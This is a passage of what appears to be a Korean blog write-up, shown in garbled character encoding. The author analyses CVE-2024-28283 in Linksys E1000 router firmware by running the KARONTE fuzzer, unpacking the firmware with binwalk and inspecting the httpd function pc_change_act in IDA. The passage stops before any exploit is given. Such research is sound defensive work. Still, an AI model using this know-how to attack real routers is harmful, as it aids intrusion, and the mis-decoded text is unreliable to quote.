ë…¼ë¬¸ì˜ ë§ë¯¸ì—ëŠ” í•´ë‹¹ í¼ì €ë¥¼ ì˜¤í”ˆì†ŒìŠ¤ë¡œ ê³µê°œí–ˆë‹¤ëŠ” ë§ë„ ìˆìœ¼ë‹ˆ(In the spirit of open science, we release the implementation of our prototype and a docker image to replicate our working environment.) ì‹¤í˜„ ê°€ëŠ¥í•œ ê³¼ì œ ìˆ˜í–‰ ë°©ì•ˆì´ë‹¤.</p> <p><a href="https://github.com/ucsb-seclab/karonte">https://github.com/ucsb-seclab/karonte</a></p> <p>ì‹œê°„ì´ ë¶€ì¡±í•´ í¼ì €ì—ì„œ ê²°ê³¼ë¥¼ ì–»ëŠ” ê²ƒì´ ê°€ëŠ¥í• ì§€ ëª¨ë¥´ê² ìœ¼ë‚˜, ìµœëŒ€í•œ ì§„í–‰í•´ ë³¸ë‹¤.</p> <p><br /></p> <h2 id="10-karonteë¥¼-í™œìš©í•œ-ë¶„ì„">1.0. KARONTEë¥¼ í™œìš©í•œ ë¶„ì„</h2> <h3 id="100-íŒì›¨ì–´-ë¶„ì„ì€-ì–´ë–»ê²Œ-ì‹œì‘í•´ì•¼-í•˜ëŠ”ê°€">1.0.0. íŒì›¨ì–´ ë¶„ì„ì€ ì–´ë–»ê²Œ ì‹œì‘í•´ì•¼ í•˜ëŠ”ê°€?</h3> <p>íŒì›¨ì–´ì— ëŒ€í•´ ë¶„ì„ì„ í•´ë³¸ ì ì€ ì—†ì–´ì„œ, ë¨¼ì € KARONTE ë…¼ë¬¸ì˜ ì´ˆì…ì„ í™•ì¸í–ˆë‹¤.</p> <p>â€˜Firmware Pre-Processingâ€™ ê³¼ì •ì—ì„œ ìë™ìœ¼ë¡œ binwalk ë“±ì˜ íˆ´ë¡œ íŒì›¨ì–´ ì´ë¯¸ì§€ë¥¼ ì–¸íŒ¨í‚¹í•œë‹¤ê³  ë˜ì–´ ìˆë‹¤.</p> <p>â€˜íŒì›¨ì–´ ì´ë¯¸ì§€ ì–¸íŒ¨í‚¹â€™ ì´ ì •í™•íˆ ì–´ë–¤ input íŒŒì¼ì„ ë„£ì–´ ì–´ë–¤ outputì„ ì–»ê³ , ê·¸ ê³¼ì •ì—ì„œ ì–´ë–¤ í–‰ìœ„ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì¸ì§€ ëª¨ë¥¸ë‹¤.</p> <p>ë”°ë¼ì„œ â€˜firmware image unpack binâ€™ìœ¼ë¡œ ê²€ìƒ‰í–ˆê³ , ì•„ë˜ì™€ ê°™ì€ ë¸”ë¡œê·¸ ê¸€ì„ í™•ì¸í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%203.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p>ì¶œì²˜: <a href="https://k1rha.tistory.com/entry/%ED%8E%8C%EC%9B%A8%EC%96%B4-%EB%B6%84%EC%84%9D-1%EB%8B%A8%EA%B3%84-bin-%ED%8C%8C%EC%9D%BC-%EA%B9%8C%EA%B8%B0-Firmware-analysis-method-Unpack-Bin-file">https://k1rha.tistory.com/entry/%ED%8E%8C%EC%9B%A8%EC%96%B4-%EB%B6%84%EC%84%9D-1%EB%8B%A8%EA%B3%84-bin-%ED%8C%8C%EC%9D%BC-%EA%B9%8C%EA%B8%B0-Firmware-analysis-method-Unpack-Bin-file</a></p> <p><br /></p> <p>íŒì›¨ì–´ ë¶„ì„ì„ í•˜ê¸° ì „ preprocessingì´ë€ bin í™•ì¥ìë¡œ ì£¼ì–´ì§„ íŒŒì¼ì„ íŒì›¨ì–´ ë¶„ì„ íˆ´ì„ í™œìš©í•´ unpack ì§„í–‰í•  ê²½ìš°, íŒŒì¼ì‹œìŠ¤í…œê³¼ ê°™ì€ unpackedëœ ê²°ê³¼ë¬¼ì´ ë–¨ì–´ì§€ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.</p> <p>íŒì›¨ì–´ëŠ” í•˜ë“œì›¨ì–´ë¥¼ êµ¬ë™í•˜ê¸° ìœ„í•´ ìƒë‹¹íˆ low-levelì—ì„œ ë™ì‘í•˜ë„ë¡ ì„¤ê³„ëœ í”„ë¡œê·¸ë¨ì´ë‹¤.</p> <p>ê·¸ëŸ° í”„ë¡œê·¸ë¨ì„ ì–¸íŒ¨í‚¹í–ˆì„ ë•Œ íŒŒì¼ì‹œìŠ¤í…œì˜ í˜•íƒœê°€ ë–¨ì–´ì§„ë‹¤ëŠ” ê±´, ì•„ë§ˆ í•˜ë“œì›¨ì–´ ì¸ìŠ¤íŠ¸ëŸ­ì…˜-OS ì¤‘ê°„ ê²©ì˜ ë™ì‘ë„ ê²¸í•˜ê¸° ë•Œë¬¸ì´ ì•„ë‹ê¹Œ ì¶”ì¸¡ëœë‹¤. ì•„ë§ˆ ë§ì„ ê²ƒ ê°™ë‹¤. ì»´í“¨í„°ì—ì„œë„ OS ë¶€íŒ…ì„ ìœ„í•´ CMOSë¼ëŠ” í•˜ë“œì›¨ì–´ ì»´í¬ë„ŒíŠ¸ë¥¼ ë”°ë¡œ ë‘ê³  ê·¸ ê¸°ë°˜ìœ¼ë¡œ ì—ëŸ¬ì»¤ë ‰ì…˜ í•´ì„œ BIOSê°€ ëŒì•„ê°€ë‹ˆê¹Œ</p> <p>ì´ ì¶”ì¸¡ì´ ë§ëŠ”ì§€ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ firmware architectureë“±ì˜ í‚¤ì›Œë“œë¡œ ê²€ìƒ‰í•´ ë³´ì•˜ë‹¤.</p> <p>ê·¸ ê²°ê³¼, íŒì›¨ì–´ëŠ” ì•„ë˜ì™€ ê°™ì€ êµ¬ì¡°ë¥¼ ê°€ì§„ë‹¤ê³  í•œë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%204.png" alt="ì¶œì²˜: [https://www.bytesnap.com/news-blog/firmware-explained-guide/](https://www.bytesnap.com/news-blog/firmware-explained-guide/)" width="80%" height="80%" /></p> <p><br /></p> <p>ì¶œì²˜: <a href="https://www.bytesnap.com/news-blog/firmware-explained-guide/">https://www.bytesnap.com/news-blog/firmware-explained-guide/</a></p> <ul> <li>Bootloader: This immutable code runs first when a device powers on. It initialises core hardware like the CPU and memory, then <strong>loads the main firmware image from storage.</strong></li> <li>OS kernel: The kernel manages system resources and provides core services like multitasking and memory allocation. For small devices, it may be a real-time operating system (RTOS).</li> <li>Device drivers: these enable the <strong>OS to communicate with hardware</strong> like radios, sensors, and storage. They <strong>abstract</strong> the hardware complexity into a common interface.</li> <li>Middleware: Middleware provides connectivity, security, protocol stacks, and other <strong>services above the OS</strong>. For example, a TCP/IP stack for network connectivity.</li> <li>Application code: The main application firmware implements the <strong>deviceâ€™s end-user functionality</strong> â€“ for example, user interfaces, algorithms, and network protocols.</li> </ul> <p><br /></p> <p>ë˜í•œ, ì•„ë˜ì™€ ê°™ì€ íŠ¹ì§•ì„ ê°€ì§€ê³  ìˆë‹¤ í•œë‹¤.(ì¶œì²˜: <a href="https://stackoverflow.com/questions/40853918/what-are-common-structures-for-firmware-files">https://stackoverflow.com/questions/40853918/what-are-common-structures-for-firmware-files</a> , chatgptë¥¼ í™œìš©í•´ ìš”ì•½)</p> <p><br /></p> <p><strong>âœï¸5-Bullet Summary:</strong></p> <ol class="notice"> <li> <p><strong>Firmware File Composition:</strong></p> <p>Firmware is stored as an Executable and Linkable File (ELF), <strong>often converted to binary (.bin)</strong> or text-based binary (.hex), and represents the exact memory content written to the embedded flash.</p> </li> <li> <p><strong>Startup Process:</strong></p> <p>On powering the board, the internal <strong>bootloader</strong> redirects execution to the firmwareâ€™s entry point (usually at address 0x0). Startup code initializes the system (e.g., setting the clock, stack pointer, vector table, and memory sections).</p> </li> <li> <p><strong>Embedded vs. OS Control:</strong></p> <p>Unlike operating systems, where user code relies on APIs and system libraries for low-level operations, <strong>embedded systems give full hardware and resource management control to user code.</strong></p> </li> <li> <p><strong>Firmware and OS Similarities:</strong></p> <p>Both firmware and operating systems handle processors, memory, and I/O similarly, organizing code and data sections in memory during initialization.</p> </li> <li> <p><strong>Key Differences:</strong></p> <ul> <li>Firmware uses <strong>physical RAM addressing</strong> due to limited memory mapping in most microcontrollers.</li> <li><strong>Stack memory in firmware is explicitly managed by user code</strong> via linker scripts, unlike OS-managed stacks in traditional programs.</li> </ul> </li> </ol> <p><br /></p> <p>ë§ˆì§€ë§‰ìœ¼ë¡œ, íŒì›¨ì–´ëŠ” í¬ê²Œ 3ê°œ ì¢…ë¥˜ë¡œ ë¶„ë¥˜ëœë‹¤ê³  í•œë‹¤.(ì¶œì²˜: <a href="https://www.spiceworks.com/tech/devops/articles/what-is-firmware/">https://www.spiceworks.com/tech/devops/articles/what-is-firmware/</a>)</p> <ul> <li><strong>Low-level firmware</strong>: These cannot be modified or altered since they are considered as integral hardware elements. They are stored on nonvolatile memory chips such as ROM and programmable ROM (PROM).</li> <li><strong>High-level firmware</strong>: These forms of firmware often have higher levels of instruction complexity than low-level firmware, bringing them closer to the realm of software than hardware. They are used in conjunction with flash memory chips to make upgrades possible.</li> <li><strong>Subsystem</strong>: They are parts of a more extensive system that can work independently. It often looks like its device because the microcode for this firmware level is built into the central processing unit (CPU), the liquid crystal display units (LCD), and the flash chips. Also, it is like high-level firmware in terms of operation.</li> </ul> <p><br /></p> <h3 id="101-karonte-input-íŒŒì¸">1.0.1. KARONTE input íŒŒì¸</h3> <p>ê·¸ëŸ°ë°, KARONTEì—ì„œëŠ” binwalkë“±ì„ ì ìš©í•´ ìë™ìœ¼ë¡œ íŒì›¨ì–´ë¥¼ ì¶”ì¶œí•œë‹¤ê³  í•œë‹¤.</p> <p>ì¦‰ ë‚´ê°€ ë¬¸ì œë¡œ ë°›ì€ bin íŒŒì¼ì„ ê·¸ëŒ€ë¡œ inputìœ¼ë¡œ ì£¼ì–´ë„ ë  ê²ƒ ê°™ì€ë°, ì´ê²Œ ë§ëŠ”ì§€ í™•ì‹¤ì¹˜ ì•Šë‹¤.</p> <p>ë”°ë¼ì„œ ì´ë¥¼ í™•ì‹¤íˆ í•˜ê¸° ìœ„í•´ KARONTEì˜ ë ˆí¬ë¥¼ í™•ì¸í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%205.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ë˜ê²Œ json_config_fileì„ ë³´ë©´ ë‚´ê°€ ë„£ì–´ì•¼ í•  input íŒŒì¼ì˜ í˜•íƒœê°€ ê°€ëŠ ë  ê²ƒ ê°™ë‹¤.</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"bin"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"pickle_parsers"</span><span class="p">:</span><span class="w"> </span><span class="s2">"./pickles/parser/NETGEAR/NETGEAR_analyzed_R6200v2-V10312_10111_fw__R6200v2-V10312_10111chkextracted_squashfs-root.pk"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"stats"</span><span class="p">:</span><span class="w"> </span><span class="s2">"False"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"data_keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"base_addr"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"eg_source_addr"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"fw_path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"./firmware/NETGEAR/analyzed/R6200v2-V1.0.3.12_10.1.11/fw/_R6200v2-V1.0.3.12_10.1.11.chk.extracted/squashfs-root"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"angr_explode_bins"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="s2">"openvpn"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"wpa_supplicant"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"vpn"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"dns"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"ip"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"log"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"qemu-arm-static"</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"var_ord"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">""</span><span class="p">],</span><span class="w">
  </span><span class="nl">"glob_var"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"arch"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"only_string"</span><span class="p">:</span><span class="w"> </span><span class="s2">"False"</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></code></pre></div></div> <p><br /></p> <p>ìœ„ ë‚´ìš©ì„ í™•ì‹¤íˆ ì´í•´í•˜ë ¤ë©´ ë ˆí¬ì˜ key ë³„ ì„¤ëª…(<a href="https://github.com/ucsb-seclab/karonte/tree/master/config">https://github.com/ucsb-seclab/karonte/tree/master/config</a>) ì„ ì½ìœ¼ë©´ ë˜ëŠ”ë°, ì‚¬ì‹¤ ë³´ë©´ ë¬´ì—‡ì„ ì°¸ì¡°í•´ ë¶„ì„í•˜ëŠ”ì§€ ì§ê´€ì ìœ¼ë¡œ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ìì„¸í•œ ì„¤ëª…ì€ í•˜ì§€ ì•ŠëŠ”ë‹¤.</p> <p>ë‚´ê°€ ì‹¤í–‰ì¤‘ì¸ docker ì»¨í…Œì´ë„ˆì—ëŠ” firmware ë””ë ‰í† ë¦¬ì— firmware datasetì´ ìˆëŠ”ë°, ìœ„ jsonì´ ì°¸ì¡°í•˜ëŠ” ë¶„ì„ ëŒ€ìƒì— ì €ì¥ëœ datasetì€ ì´ë¯¸ unpackì´ ë˜ì–´ ìˆëŠ” í˜•íƒœë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%206.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ë‚˜ë³´ê³  unpackí•´ì„œ ë„£ì–´ë†“ìœ¼ë¼ëŠ” ì†Œë¦¬ ê°™ë‹¤.</p> <p>binwalkë¡œ ì§ì ‘ unpackì„ í•´ë³´ê³  ê·¸ ê²°ê³¼ë¬¼ê³¼ ë¹„êµí•´ë³´ì.</p> <p><br /></p> <h3 id="102-unpack">1.0.2. unpack</h3> <p><code class="language-plaintext highlighter-rouge">&gt;docker cp ./FW_E1000_2.1.03.005_US_20140321.bin karonte:/</code> ëª…ë ¹ì–´ë¡œ ëŒ€ìƒ íŒì›¨ì–´ë¥¼ ì»¨í…Œì´ë„ˆë¡œ ì „ì†¡í–ˆë‹¤.</p> <p>ê·¸ë¦¬ê³  ì•„ë˜ì™€ ê°™ì´ binwalkë¥¼ í™œìš©í•´ unpackí–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%207.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ê·¸ëŸ¬ë‚˜ ì•„ë˜ì™€ ê°™ì€ ì—ëŸ¬ê°€ ë°œìƒí–ˆë‹¤.</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Extractor.execute failed to run external extractor 'sasquatch -p 1 -le -d '%%squashfs-root%%' '%e'': [Errno 2] No such file or directory

</code></pre></div></div> <p><br /></p> <p>ì°¾ì•„ë³´ë‹ˆ, squashfs íŒŒì¼ì‹œìŠ¤í…œê³¼ ê´€ë ¨í•´ì„œë§Œ í•´ë‹¹ ì—ëŸ¬ê°€ ìƒê¸°ëŠ” ê²ƒìœ¼ë¡œ ì¶”ì •ë˜ë©°, sasquatch ëª¨ë“ˆì„ ë”°ë¡œ ì„¤ì¹˜í•´ í•´ê²°í•  ìˆ˜ ìˆë‹¤ê³  í•œë‹¤. (https://github.com/threadexio/sasquatch.git)</p> <p>ì„¤ì¹˜í•´ì„œ ì¶”ì¶œí•´ ë³´ë‹ˆ, ì•„ë˜ì™€ ê°™ì´ ë¬¸ì œì—†ì´ ì™„ë£Œë˜ì—ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%208.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ì¶”ì¶œëœ .extracted ë””ë ‰í† ë¦¬ë¥¼, ìœ„ì˜ configì— ë‚˜ì˜¨ ë‚´ìš©(<code class="language-plaintext highlighter-rouge">/firmware/NETGEAR/analyzed/R6200v2-V1.0.3.12_10.1.11/fw/</code>)ì„ ì°¸ê³ í•˜ì—¬ ì´ë™í•´ ë‘ì—ˆë‹¤.</p> <p>ìœ„ì˜ ì´ë™ì„ ë°˜ì˜í•œ config íŒŒì¼ì€ ì•„ë˜ì™€ ê°™ì´ ìƒì„±í–ˆë‹¤.</p> <p><br /></p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"bin"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"pickle_parsers"</span><span class="p">:</span><span class="w"> </span><span class="s2">"./pickles/parser/Linksys/Linksys/analyzed/E1000/fw/_FW_E1000_2.1.03.005_US_20140321.bin.extracted/squashfs-root.pk"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"stats"</span><span class="p">:</span><span class="w"> </span><span class="s2">"False"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"data_keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"base_addr"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"eg_source_addr"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"fw_path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"./firmware/Linksys/analyzed/E1000/fw/_FW_E1000_2.1.03.005_US_20140321.bin.extracted/squashfs-root"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"angr_explode_bins"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="s2">"openvpn"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"wpa_supplicant"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"vpn"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"dns"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"ip"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"log"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"qemu-arm-static"</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"var_ord"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">""</span><span class="p">],</span><span class="w">
  </span><span class="nl">"glob_var"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"arch"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"only_string"</span><span class="p">:</span><span class="w"> </span><span class="s2">"False"</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></code></pre></div></div> <p><br /></p> <p>ê·¸ë¦¬ê³  ì•„ë˜ì™€ ê°™ì´ KARONTEë¥¼ run í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%209.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ê·¸ëŸ¬ë‚˜ Border Binaries Discovery ë‹¨ê³„ì—ì„œ ë” ì´ìƒ ë„˜ì–´ê°€ì§€ ëª»í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2010.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ë„¤íŠ¸ì›Œí¬ì™€ ìƒí˜¸ì‘ìš©í•˜ëŠ” ë°”ì´ë„ˆë¦¬ë¥¼ BBDì—ì„œ ì°¾ì•„ë‚¸ë‹¤ê³  í–ˆëŠ”ë°â€¦. ë¬´ìŠ¨ ë¬¸ì œì¸ì§€ ëª¨ë¥´ê² ë‹¤.</p> <p>ì˜¬ë°”ë¥´ê²Œ configì„ í•´ì•¼ í•˜ë‚˜ ì‹¶ì€ë°, ì–´ë–»ê²Œ í•´ì•¼ í• ì§€ ë” ê³ ë¯¼í•´ ë´ì•¼ í•  ê²ƒ ê°™ë‹¤.</p> <p>ë§Œì•½ í¼ì§•ìœ¼ë¡œ ì°¾ì§€ ëª»í•œ ì·¨ì•½ì ì´ë¼ë©´, reporterëŠ” ì–´ë–¤ ê²½ë¡œë¡œ ì´ ì·¨ì•½ì ì„ ì°¾ì•˜ì„ê¹Œ?</p> <p><br /></p> <h2 id="11-ì •ì -ë¶„ì„">1.1. ì •ì  ë¶„ì„</h2> <h3 id="110-ë¶„ì„-ëŒ€ìƒ-íŒŒì¼-ì°¾ê¸°">1.1.0. ë¶„ì„ ëŒ€ìƒ íŒŒì¼ ì°¾ê¸°</h3> <p>ì¼ë‹¨ ì·¨ì•½ì ì´ ë°œìƒí•œ íŒŒì¼ì¸ httpd íŒŒì¼ì„ ì°¾ì•„ì•¼ í•œë‹¤.</p> <p>httpdë©´ apache ì›¹ì„œë²„ì¸ê°€? ë³´í†µ ì´ê±´ /etc/httpd ë””ë ‰í† ë¦¬ í˜•íƒœë¡œ ë–¨ì–´ì§€ëŠ”ë°.</p> <p>ë°”ì´ë„ˆë¦¬ í˜•íƒœë¡œ ë–¨ì–´ì§„ ê±°ë©´ <code class="language-plaintext highlighter-rouge">/bin</code> , <code class="language-plaintext highlighter-rouge">/sbin</code> , <code class="language-plaintext highlighter-rouge">/usr/bin</code> , <code class="language-plaintext highlighter-rouge">/usr/sbin</code> ì¤‘ í•˜ë‚˜ì—ëŠ” ìˆê² ë‹¤ ìƒê°í–ˆë‹¤.</p> <p>ê·¸ë ‡ê²Œ ìƒê°í•˜ê³  ì°¾ì•„ë³´ë‹ˆ, <code class="language-plaintext highlighter-rouge">/usr/sbin/</code>ì—ì„œ ì°¾ì„ ìˆ˜ ìˆì—ˆë‹¤.</p> <p>ì´ë ‡ê²Œ íœ´ë¦¬ìŠ¤í‹±í•œ ë°©ì‹ ë§ê³  ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œë„ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p> <p><br /></p> <ol> <li>êµ¬ê¸€ë§ <ul> <li> <p>httpd firmwareë¥¼ ê²€ìƒ‰í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ íŒì›¨ì–´ìƒì˜ httpd ë°”ì´ë„ˆë¦¬ì—ì„œ ë°œìƒí•œ CVE ë¶„ì„ ê¸€ì´ ìˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2011.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> </li> <li> <p>í•´ë‹¹ CVEëŠ” netgear ë¼ìš°í„°ì—ì„œ ë°œìƒí•œ ì·¨ì•½ì ì´ë‹¤. ì§€ê¸ˆ ë¶„ì„ ëŒ€ìƒ íŒì›¨ì–´ ë˜í•œ ë¼ìš°í„° íŒì›¨ì–´ì¸ ì ì„ ê³ ë ¤í–ˆì„ ë•Œ, ë¹„ìŠ·í•œ OS ë° ì‹œìŠ¤í…œ êµ¬ì¡°ë¥¼ ì°¨ìš©í•˜ê³  ìˆì„ ê°€ëŠ¥ì„±ì´ ë†’ìœ¼ë¯€ë¡œ ê·¸ëŒ€ë¡œ <code class="language-plaintext highlighter-rouge">/usr/sbin</code>ì„ ì°¾ì•„ë³´ë©´ httpd íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆì—ˆì„ ê²ƒì´ë‹¤.</p> </li> </ul> </li> <li>everything <ol> <li>ì œì¼ ì‰½ê¸´ í•œë° í•œ 10ë¶„ ê¸°ë‹¤ë ¤ì•¼ í•œë‹¤.</li> <li>everything ìœ í‹¸ë¦¬í‹°ê°€ ì¶”ì¶œí•œ íŒì›¨ì–´ íŒŒì¼ì‹œìŠ¤í…œì— ëŒ€í•´ ë¶„ì„ì„ í•´ì•¼ í•˜ê¸° ë•Œë¬¸ì—â€¦</li> <li> <p>ê·¸ë˜ë„ ê²€ìƒ‰í•˜ë©´ ì´ë ‡ê²Œ httpdë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2012.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> </li> </ol> </li> </ol> <p><br /></p> <h3 id="111-ë¶„ì„">1.1.1. ë¶„ì„</h3> <p><strong>pc_change_act</strong></p> <p>IDAì— ë„£ê³  ë„ìš´ ë‹¤ìŒ function ì´ë¦„(<code class="language-plaintext highlighter-rouge">pc_change_act</code>)ìœ¼ë¡œ ê²€ìƒ‰í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2013.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ë¬¸ì œì˜ ì¡°ê±´ê³¼ ì™„ì „íˆ ì¼ì¹˜í•˜ëŠ” í•¨ìˆ˜ì„ì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.</p> <p>ì´ìª½ì—ì„œ ë³´ì´ëŠ” ë¬¸ìì—´ë“¤ì€ ë³´í†µ ë¼ìš°í„°ë¥¼ ê´€ë¦¬ ë° ì„¤ì •í•  ë•Œ ë³´ë‚´ëŠ” ì„¤ì •í‚¤ë°¸ë¥˜ì˜ í‚¤ê°’ì¸ ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.</p> <p>ì™œëƒí•˜ë©´ ë¼ìš°í„° íŒì›¨ì–´ë¼ëŠ” ì ì„ ê³ ë ¤í–ˆì„ ë•Œ WTPëŠ” Wireless Transcation Protocolì˜ ì•½ìì¸ ê²ƒ ê°™ê³ , ë³´í†µ ì´ëŸ° í˜•ì‹ì˜ ë¬¸ìì—´ì´ë©´ ë¼ìš°í„° ê´€ë¦¬ë³€ê²½ ì‹œì— ì‚¬ìš©í•˜ëŠ” í™˜ê²½ë³€ìˆ˜ ê°’ì´ê³ ,</p> <p>ìœ„ì˜ ìƒê°ì— ê·¼ê±°í•´ linksys pc_enableë¡œ ê²€ìƒ‰í•´ ë³´ë‹ˆ, ì•„ë˜ì™€ ê°™ì´ nvram infoì˜ í‚¤ê°’ ì¤‘ í•˜ë‚˜ì¸ ì ì´ í™•ì¸ë˜ì—ˆê¸° ë•Œë¬¸ì´ë‹¤.(ìŠ¤í¬ë¡¤ì´ ë„ˆë¬´ ê¸¸ì–´ PC_enableì€ ì•ˆ ë³´ì„)</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2014.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ê·¸ëŸ¼ ì´ì œ <code class="language-plaintext highlighter-rouge">pc_change_act</code> í•¨ìˆ˜ë¥¼ ë“¤ì—¬ë‹¤ ë³´ì.</p> <p>ë¬¸ì œì—ì„œëŠ” íŒíŠ¸ë¡œ <code class="language-plaintext highlighter-rouge">get_cgi</code>ë¥¼ ì–¸ê¸‰í–ˆëŠ”ë°, <code class="language-plaintext highlighter-rouge">get_cgi</code>ì˜ xrefë¥¼ ë³´ë©´ ë§¤ìš° ë§ì€ ì ì„ ì•Œ ìˆ˜ ìˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2015.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ì´ëŸ° ìƒí™©ì—ì„œ <code class="language-plaintext highlighter-rouge">get_cgi</code>ë¥¼ ë£¨íŠ¸ì»¤ì¦ˆë¡œ íŒë‹¨í•˜ëŠ” ê²ƒì€ ë…¼ë¦¬ì ìœ¼ë¡œ í‹€ë¦° ì¶”ì¸¡ì´ ëœë‹¤.</p> <p>ê·¸ë³´ë‹¤ëŠ” <code class="language-plaintext highlighter-rouge">get_cgi</code>ì˜ ê°’ì„ ë‚´ë¶€ì ìœ¼ë¡œ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì—ì„œ ë¬¸ì œê°€ ìƒê²¼ë‹¤ê³  ë³´ëŠ” ê²ƒì´ ë§ê³ , ë”°ë¼ì„œ <code class="language-plaintext highlighter-rouge">pc_change_act</code> í•¨ìˆ˜ì— ë£¨íŠ¸ì»¤ì¦ˆê°€ ìˆë‹¤ê³  íŒë‹¨í•˜ëŠ” ê²ƒì´ ë§ë‹¤ê³  ìƒê°í•œë‹¤.</p> <p>ì´ì œ ìƒì„¸í•˜ê²Œ ë‚´ë¶€ ë°ì´í„° ì²˜ë¦¬ ë£¨í‹´ì„ íŒŒì•…í•´ ë³´ì.</p> <p>ë¨¼ì € í•´ë‹¹ í•¨ìˆ˜ì˜ ë‚´ë¶€ì—ì„œëŠ” <code class="language-plaintext 